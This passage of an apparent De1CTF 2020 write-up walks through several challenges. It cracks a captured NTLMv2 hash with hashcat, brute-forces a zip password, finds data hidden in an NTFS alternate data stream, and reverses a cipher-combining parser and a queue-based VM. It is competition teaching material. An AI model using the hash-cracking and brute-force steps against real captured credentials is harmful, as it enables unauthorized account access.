<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF2020::TEST:56886f90fcb73ded:b5991cc2a0d585d0f813358eaafc7412:0101000000000000130cb9102308d601d2290bc0c25617a80000000002000800540045005300540001000c0044004d0032003000310032000400140074006500730074002e006c006f00630061006c000300220064006d0032003000310032002e0074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800130cb9102308d60106000400020000000800300030000000000000000000000000100000ecaa3d44ddc464026c453206813aafa0b918f2ad43d497ef8fb6beb2083258a40a0010000000000000000000000000000000000009001e0048005400540050002f0074006500730074002e006c006f00630061006c000000000000000000</span><br></pre></td></tr></table></figure>
<p>Then use hashcat to brute force</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat64.exe -m 5600 De1CTF2020::TEST:56886f90fcb73ded:b5991cc2a0d585d0f813358eaafc7412:0101000000000000130cb9102308d601d2290bc0c25617a80000000002000800540045005300540001000c0044004d0032003000310032000400140074006500730074002e006c006f00630061006c000300220064006d0032003000310032002e0074006500730074002e006c006f00630061006c000500140074006500730074002e006c006f00630061006c0007000800130cb9102308d60106000400020000000800300030000000000000000000000000100000ecaa3d44ddc464026c453206813aafa0b918f2ad43d497ef8fb6beb2083258a40a0010000000000000000000000000000000000009001e0048005400540050002f0074006500730074002e006c006f00630061006c000000000000000000 ?d?d?d?d?d?d?d?d -a 3 --force</span><br></pre></td></tr></table></figure>
<p>get part3: <code>74212345</code></p>
<p>So the final flag is: De1CTF{79345612_15673223_74212345}</p>
<h2><span id="misc_chowder">Misc_Chowder</span></h2>
<p>There is a <code>Misc_Chowder.pcap</code> given.Use wireshark to open it. Export the HTTP objects. You can see the type <code>multipart/form-data</code>. There are some data in them.</p>
<figure>
<img src="https://i.loli.net/2020/05/06/Ccub47IsZDMRYT9.png" alt><figcaption>1588654908630.png</figcaption>
</figure>
<p>Extract the content and you will find a <code>png</code> file.(the begin of this png is <code>89504E47</code>and the end of this png is <code>426082</code>), use <code>winhex</code> to extract it. And then you will get this information.</p>
<figure>
<img src="https://i.loli.net/2020/05/06/bNfZDhv3aI4PGnM.png" alt><figcaption>123.png</figcaption>
</figure>
<p>Download it and you will get the <code>readme.zip</code>.There is a <code>readme.docx</code> in it. Change the filename of readme.docx to 123.zip ,open it and you will find the<code>You_found_me_Orz.zip</code>.You need to use <code>brute-force attack</code> to get the password of <code>You_found_me_Orz.zip</code>.There is a tip here:<code>The password is composed of six letters, and the two letters at the beginning of the password are D and E.</code></p>
<p>And then you can get the password is <code>DE34Q1</code>.</p>
<figure>
<img src="https://i.loli.net/2020/05/06/RaTcEAtufyWJZoK.png" alt><figcaption>1588656395938.png</figcaption>
</figure>
<p>Now you get a new file <code>You_found_me_Orz.jpg</code>.Use <code>notepad++</code> or <code>winhex</code> to open it.You will find <code>666.jpg</code>、<code>flag.txt</code>、<code>fffffffflllll.txt</code>and other files.Change the filename of <code>You_found_me_Orz.jpg</code> to <code>You_found_me_Orz.rar</code> ,open it and you will get the files except <code>fffffffflllll.txt</code></p>
<figure>
<img src="https://i.loli.net/2020/05/06/UoWJA1RF4zmMdf7.png" alt><figcaption>1588655950372.png</figcaption>
</figure>
<p>There is a file <code>flag.txt</code> in it, which content is</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF&#123;jaivy say that you almost get me!!! &#125;</span><br></pre></td></tr></table></figure>
<p>but it's a fake flag and you need to find the real one.</p>
<p>The test point is <code>ADS steganography</code> .You can use <code>Shortcut to NTFS Streams Info</code> to open it, and you will find the <code>fffffffflllll.txt</code> is hidden in <code>666.jpg</code>.</p>
<figure>
<img src="https://i.loli.net/2020/05/06/KvL1X6YP7DedxrR.png" alt><figcaption>1588656264938.png</figcaption>
</figure>
<p>Extract it and you get the real flag!</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">De1CTF&#123;E4Sy_M1sc_By_Jaivy_31b229908cb9bb&#125;</span><br></pre></td></tr></table></figure>
<h1><span id="reverse">reverse</span></h1>
<h2><span id="parser">parser</span></h2>
<h3><span id="idea">Idea</span></h3>
<p>I'm studying compilation principles recently, so I make a very simple lexer and parser to parse flag.</p>
<p>Here is the grammar:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">∑ ：</span><br><span class="line">De1CTF  &quot;De1CTF&quot;</span><br><span class="line">LB          &quot;&#123;&quot;</span><br><span class="line">RB          &quot;&#125;&quot;</span><br><span class="line">WORD        &quot;[0-9a-zA-Z]+&quot;</span><br><span class="line">ADD         &quot;+&quot;</span><br><span class="line">UL          &quot;_&quot;</span><br><span class="line">LP          &quot;(&quot;</span><br><span class="line">RP          &quot;)&quot;</span><br><span class="line">CR          &quot;\n&quot;</span><br><span class="line"></span><br><span class="line">N ：</span><br><span class="line">FLAG, PRIM, EXP, TERM, WORD</span><br><span class="line"></span><br><span class="line">P ：</span><br><span class="line">FLAG -&gt; De1CTF LB EXP RB CR</span><br><span class="line">EXP -&gt;  TERM</span><br><span class="line">      | TERM ADD TERM</span><br><span class="line">TERM -&gt; PRIM </span><br><span class="line">          | PRIM UL TERM</span><br><span class="line">PRIM -&gt; WORD</span><br><span class="line"></span><br><span class="line">S : FLAG</span><br></pre></td></tr></table></figure>
<p>Just like arithmetic.</p>
<p>First, the lexer will depart the string into tokens, and check the format.</p>
<p>All words will be encrypted with RC4</p>
<p>We need to define some notation:</p>
<p>"a+b" denotes AES_encrypt("ab")</p>
<p>"a_b" denotes DES_encrypt("ab")</p>
<p>“_" has higher priority than "+"</p>
<p>I didn't implement the brackets, because it may lead to multi-solution(you can add brackets infinitely), and it will also make the solver complex.</p>
<p>Compilation optimization is not enabled, because it's very difficult to reverse. I use g++ 9.0 to compile it, the endbr64 instruction will disturb IDA to identify got table, but you can find the function name by gdb. The symbol table has much useful information, so it is stripped.</p>
<h3><span id="reverse">Reverse</span></h3>
<p>I write this program in C++ and strip the symbol table, so it's a little difficult to analyze statically.</p>
<p>At first, you can input some strings to test, and it's easy to confirm the format and structure.</p>
<p>I suggest guessing the logic of the program while debugging. Soon you can find out the input string will be departed into many parts at <code>sub_35F0</code>. It defines a structure Token here. The member contains substring and type. These token will store in an std::vector.</p>
<p>Tracing the token into <code>sub_4E70</code> and <code>sub_507E</code>, you can find some recursive functions and finally in <code>sub_51CC</code>, the type 4 token which means <code>WORD</code> will be encrypted by RC4.</p>
<p>We can trace the vector and final in <code>sub_507E</code> we find a loop. If next token is not <code>_</code> it will break. After getting a token <code>_</code>, get next <code>WORD</code>, splice them, and in <code>sub_70F6</code> encrypt it by DES.</p>
<p>After return to<code>sub_4E70</code>, it does something similar. There is a loop and break condition is that the next token is not <code>+</code>. Then call <code>sub_507E</code> again to get another part of the result, and splice them and in <code>sub_6E8B</code> encrypt it by AES.</p>
<p>Here you almost reverse the program totally. The most important thing is the precedence of <code>+</code> and <code>_</code>.</p>
<p>The aes and des use the same key <code>De1CTF</code> and will be padded to correct length. All the crypto cipher is the standard cipher. The implement of AES is a little different between normal AES, but the results are the same. (you will not find the SBOX of AES in the cipher).</p>
<h3><span id="solver">Solver</span></h3>
<p>Notice that all the plain will be padded by PKCS7, so we could try to decrypt and find the padding.</p>
<p>After get the cipher, consider it is like "A+B+C+D" or "A_B_C_D", so you could decrypt it by aes or des.</p>
<p>After we find out the last step is aes:</p>
<p>result = aes(result_before+D)</p>
<p>Although we don't know how many terms the result_before have, we know that the last part is a single term. And we should confirm this term is like d1_d2_d3(will be the result of des encryption) or d4 directly(will be the result of rc4 encryption).</p>
<p>Although we don't know how long is the last part, the result_before may be the result of des or aes(if it is the cipher of rc4, we can use rc4 decrypt it into plaintext directly and get the length), so the length must be a multiple of 8. So we can decrypt last 8*n bytes by des and rc4, and find the PKCS7 padding or the plain.</p>
<p>And so on, we depart every part and finally get the plaintext.</p>
<p>And the detail of the analysis will be written in the scrip:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> ARC4, AES, DES</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.Padding <span class="keyword">import</span> unpad</span><br><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> *</span><br><span class="line">key = <span class="string">b"De1CTF"</span></span><br><span class="line">rc4_key = key</span><br><span class="line">des_key = key.ljust(<span class="number">8</span>, <span class="string">b"\x02"</span>)</span><br><span class="line">aes_key = key.ljust(<span class="number">16</span>, <span class="string">b"\x0a"</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rc4_decrypt</span><span class="params">(cipher, key=rc4_key)</span>:</span></span><br><span class="line">    rc4 = ARC4.new(key)</span><br><span class="line">    <span class="keyword">return</span> rc4.decrypt(cipher)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">aes_decrypt</span><span class="params">(cipher, key=aes_key)</span>:</span></span><br><span class="line">    aes = AES.new(key, iv=key, mode=AES.MODE_CBC)</span><br><span class="line">    <span class="keyword">return</span> aes.decrypt(cipher)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">des_decrypt</span><span class="params">(cipher, key=des_key)</span>:</span></span><br><span class="line">    des = DES.new(key, iv=key, mode=AES.MODE_CBC)</span><br><span class="line">    <span class="keyword">return</span> des.decrypt(cipher)</span><br><span class="line">flag = <span class="string">b"&#125;"</span></span><br><span class="line">cipher = <span class="string">b"\xe7\xa43L\xd3\x11\xe7\x85hV\x97\x11\xee\xd2\xf8\xd9&gt;p\xc9N\x94\xa02Z'\x98\x00\x1d\xd5\xd7\x11\x1d\xf4\x85a\xac\x0c\x80'@\xbd\xdd\x1f\x0b\xb4\x97\x1f`[T\xcb\xc5\xa8\xb7\x11\x90\xc9\xb5\x81eS\x0f~\x7f"</span></span><br><span class="line"><span class="comment"># It is unlikely that the result is a word. You can try rc4_decrypt(cipher) and get nothing.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Last result may be like A+B+C+D or A_B_C_D, so we try aes and des decrypt.</span></span><br><span class="line">print(des_decrypt(cipher))</span><br><span class="line"><span class="comment"># b'\x0e\x08r\xa8C\x14u\xae\xee\xd6)9.Q\xd3\xca|\xcf.\xde\xb9&lt;\x8f4N\xcaP%X&gt;5,\x1fIu\x89\xd5\xb3\xf5[1\x9b\x86Q\x86&amp;\x05\xc8FGW\xf3\xfd&amp;\xb4[#\x16O4\x94:h\x90'</span></span><br><span class="line">print(aes_decrypt(cipher))</span><br><span class="line"><span class="comment"># b"\x0b\x82z\x9e\x00.\x07m\xe2\xd8L\xac\xb1#\xbc\x1e\xb0\x8e\xbe\xc1\xa4T\xe0\xf5P\xc6]7\xc5\x8c&#125;\xaf-H'4-;\x13\xd9s\x0f%\xc1v\x89\x19\x8b\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10\x10"</span></span><br><span class="line"><span class="comment"># We find the padding in aes result, so last result is like A+B+C+D.</span></span><br><span class="line">cipher = unpad(aes_decrypt(cipher), <span class="number">16</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># The last part must be a TERM, which may be like d1_d2_d3_d4 or d1 directly.</span></span><br><span class="line"><span class="comment"># Try last 8*n bytes, and find padding or plaintext</span></span><br><span class="line"><span class="comment"># print(rc4_decrypt(cipher[-8:])) # nothing</span></span><br><span class="line"><span class="comment"># print(rc4_decrypt(cipher[-16:])) # nothing</span></span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">print(des_decrypt(cipher[<span class="number">-8</span>:]))</span><br><span class="line"><span class="comment"># b'G*\x11p~z\x16\xdc'</span></span><br><span class="line">print(des_decrypt(cipher[<span class="number">-16</span>:]))</span><br><span class="line"><span class="comment"># b'\xcd\xc55\x89\x9f#\xf0\xb2.\x07\x07\x07\x07\x07\x07\x07'</span></span><br><span class="line"><span class="comment"># Find the padding here, so the last term is like d1_d2_d3_d4</span></span><br><span class="line">term_1 = unpad(des_decrypt(cipher[<span class="number">-16</span>:]), <span class="number">8</span>)</span><br><span class="line">cipher = cipher[:<span class="number">-16</span>] <span class="comment"># The first part.</span></span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Notice the length is 9, it's very short. if the last byte is a sinle primary_expr, the padding will be found in des_decrypt[0:8]</span></span><br><span class="line"><span class="comment"># or try to rc4 decrypt the whole result.</span></span><br><span class="line">print(rc4_decrypt(term_1))</span><br><span class="line"><span class="comment"># Find a plaintext b"4nd", the left part will be another plaintext.</span></span><br><span class="line">print(rc4_decrypt(term_1[<span class="number">3</span>:]))</span><br><span class="line"><span class="comment"># b"p4r53r"</span></span><br><span class="line">word_1 = rc4_decrypt(term_1[<span class="number">3</span>:])</span><br><span class="line">word_2 = rc4_decrypt(term_1[:<span class="number">3</span>])</span><br><span class="line">flag = word_2 + <span class="string">b"_"</span> + word_1 + flag</span><br><span class="line">flag = <span class="string">b"+"</span> + flag</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Next, we do the same thing again.</span></span><br><span class="line">print(des_decrypt(cipher))</span><br><span class="line"><span class="comment"># b"\xa7\xaf\xa7\xe8#I\x9e#6X\x19\xed\xd5\x06\xcc\x86\xe4OC\x89 \x15\xff'\xd8\xe1f\x95\xfc\x99\xf8\x1e"</span></span><br><span class="line">print(aes_decrypt(cipher))</span><br><span class="line"><span class="comment"># b'\x91\x98=\xa9\xb1:1\xef\x04r\xb5\x02\x07;h\xdd\xbd\xdb&lt;\xc1&#125;\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b'</span></span><br><span class="line">cipher = unpad(aes_decrypt(cipher), <span class="number">16</span>)</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Also find last part length</span></span><br><span class="line">print(des_decrypt(cipher[<span class="number">-8</span>:]))</span><br><span class="line">print(des_decrypt(cipher[<span class="number">-16</span>:]))</span><br><span class="line"><span class="comment"># Find the padding</span></span><br><span class="line">term_2 = unpad(des_decrypt(cipher[<span class="number">-16</span>:]), <span class="number">8</span>)</span><br><span class="line">cipher = cipher[<span class="number">0</span>:<span class="number">-16</span>]</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># rc4 decrypt directly</span></span><br><span class="line">print(rc4_decrypt(term_2))</span><br><span class="line"><span class="comment"># Find the plaintext b"w0rld"</span></span><br><span class="line">print(rc4_decrypt(term_2[<span class="number">5</span>:]))</span><br><span class="line"><span class="comment"># b"l3x3r"</span></span><br><span class="line">word_3 = rc4_decrypt(term_2[<span class="number">5</span>:])</span><br><span class="line">word_4 = rc4_decrypt(term_2[:<span class="number">5</span>])</span><br><span class="line">flag = word_4 + <span class="string">b"_"</span> + word_3 + flag</span><br><span class="line">flag = <span class="string">b"+"</span> + flag</span><br><span class="line">print()</span><br><span class="line"></span><br><span class="line"><span class="comment"># Last part is less than 8 bytes. rc4_decrypt it directly</span></span><br><span class="line">print(rc4_decrypt(cipher))</span><br><span class="line">word_5 = rc4_decrypt(cipher)</span><br><span class="line">flag = word_5 + flag</span><br><span class="line"></span><br><span class="line">flag = <span class="string">b"De1CTF&#123;"</span> + flag</span><br><span class="line">print(flag)</span><br></pre></td></tr></table></figure>
<p>I think there may be a way to write a script to solve it automatically, but I didn't try.</p>
<h2><span id="flw">Flw</span></h2>
<h3><span id="vm-instruction">VM instruction</span></h3>
<p><code>unsigned char flag[] = "de1ctf{Innocence_Eye&amp;Daisy*}";</code></p>
<p>This is a queue-based virtual machine.</p>
<p>The structure of the virtual machine is as follows:</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">QueueVirtualMachine</span>&#123;</span></span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    QueueVirtualMachine();</span><br><span class="line">    QueueVirtualMachine(<span class="keyword">unsigned</span> <span class="keyword">char</span>*);</span><br><span class="line">    ~QueueVirtualMachine();</span><br><span class="line">    <span class="function"><span class="keyword">bool</span> <span class="title">run</span><span class="params">()</span></span>;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printQueueMemSpace</span><span class="params">()</span></span>; <span class="comment">//Used to get debugging information</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">printMemSpace</span><span class="params">()</span></span>;      <span class="comment">//Used to get debugging information</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="keyword">int</span> head,tail;         <span class="comment">//The head and tail pointer of the queue</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">short</span> reg;    <span class="comment">//The register used to calculate the packet base58</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *queueMemSpace;<span class="comment">//Queue space</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *memSpace;     <span class="comment">//Memory space</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *codeSpace;    <span class="comment">//Code segment</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">char</span> *tempString;   <span class="comment">//String buffer</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>The instructions of the virtual machine are as follows:</p>
<ul>
<li>14 xx</li>
</ul>
<p>Press a number into the end of the queue</p>
<ul>
<li>15</li>
</ul>
<p>Discard a queue tail element</p>
<ul>
<li>20 xx</li>
</ul>
<p>Place a byte of the queue header in the location of 'memSpace[xx]'</p>
<ul>
<li>2a xx</li>
</ul>
<p>Press a byte of 'memspace[xx]' into the end of the queue</p>
<ul>
<li>2b</li>
</ul>
<p>Take a piece of data from the head of the queue as an index and press a byte of memspace[] into the end of the queue</p>
<ul>
<li>2c</li>
</ul>
<p>Take a piece of data from the queue header as an index and put the next byte in the queue into memspace[]</p>
<ul>
<li>30</li>
</ul>
<p>Let's move reg 8 bits to the left, and then reg plus the element at the end of the queue</p>
<ul>
<li>31 xx</li>
</ul>
<p>Short in register divided by xx, remainder into queue, quotient in reg</p>
<ul>
<li>32</li>
</ul>
<p>A byte at the head of the queue is taken as the index value of table[], and the value result is queued</p>
<ul>
<li>33</li>
</ul>
<p>Take the sum of the two data at the head of the queue, and the result is queued</p>
<ul>
<li>34</li>
</ul>
<p>The two data at the head of the queue are subtracted and the result is queued.</p>
<p>Notice that the decrement is at the head of the queue</p>
<ul>
<li>35</li>
</ul>
<p>Take the two data phases of the queue head ×, and the result is queued</p>
<ul>
<li>36</li>
</ul>
<p>The data in the register is queued and the register is cleared</p>
<ul>
<li>37</li>
</ul>
<p>Take two data at the head of the queue that are xor, and the result is queued</p>
<ul>
<li>3a</li>
</ul>
<p>Read in a string, place the string in the buffer, and queue the string length</p>
<ul>
<li>40 xx</li>
</ul>
<p>Takes a number at the head of the queue, if the number is not zero</p>
<p>Xx op - =</p>
<ul>
<li>41</li>
</ul>
<p>The string in the buffer is queued to clear the buffer</p>
<ul>
<li>ab</li>
</ul>
<p>The instruction completes and returns true</p>
<ul>
<li>ff</li>
</ul>
<p>If the queue header is not 0, the virtual machine returns the bool value 'false'</p>
<h3><span id="algorithm-design">Algorithm design</span></h3>
<p>1.Read the string, detect the length, and move into memSpace</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//cin&gt;&gt;tempString;</span></span><br><span class="line"><span class="number">0x3a</span>,</span><br><span class="line"><span class="comment">//if(strlen(tempString)!=28)return false;</span></span><br><span class="line"><span class="number">0x14</span>,<span class="number">28</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="comment">//Move the string into the buffer</span></span><br><span class="line"><span class="number">0x41</span>,</span><br><span class="line"><span class="comment">//Move into memory from the queue</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x19</span>,<span class="comment">//d</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1a</span>,<span class="comment">//e</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1b</span>,<span class="comment">//1</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1c</span>,<span class="comment">//c</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1d</span>,<span class="comment">//t</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1e</span>,<span class="comment">//f</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x1f</span>,<span class="comment">//&#123;</span></span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x20</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x21</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x22</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x23</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x24</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x25</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x26</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x27</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x28</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x29</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2a</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2b</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2c</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2d</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2e</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x2f</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x30</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x31</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x32</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x33</span>,</span><br><span class="line"><span class="number">0x20</span>,<span class="number">0x34</span>,<span class="comment">//&#125;</span></span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li>Check the format.</li>
</ol>
<p>The following several inspections are scattered throughout the virtual machine instructions.</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x2a</span>,<span class="number">0x19</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'D'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1a</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'e'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1b</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'1'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1c</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'C'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'T'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1e</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'F'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x1f</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'&#123;'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br><span class="line"><span class="number">0x2a</span>,<span class="number">0x34</span>,</span><br><span class="line"><span class="number">0x14</span>,<span class="string">'&#125;'</span>,</span><br><span class="line"><span class="number">0x34</span>,</span><br><span class="line"><span class="number">0xff</span>,</span><br></pre></td></tr></table></figure>
<p>Junk instructions：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span 